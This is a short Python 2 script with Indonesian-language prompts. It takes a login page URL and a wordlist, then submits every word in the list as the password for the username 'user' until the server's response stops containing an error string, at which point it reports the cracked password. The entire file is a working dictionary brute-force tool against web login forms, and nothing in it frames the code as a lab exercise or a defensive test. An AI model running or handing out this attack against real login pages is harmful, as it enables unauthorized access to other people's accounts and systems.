#!/usr/bin/env python

import requests
import string
import time

input1 = raw_input("Masukkan URL halaman login : ")

file = open(raw_input("Masukkan path ke word list yang digunakan : "), 'rt')

for x in file.readlines():
	x = x.strip()
	print "Trying " + x
	data1 = {
		"username" : "user",
		"password" : "%s" %x,
		"submit" : "LOGIN"
	}
	print data1
	response = requests.post(input1, data1)
	if "Something wrong" not in response.text:
		print x + " Success!"
		break
	
		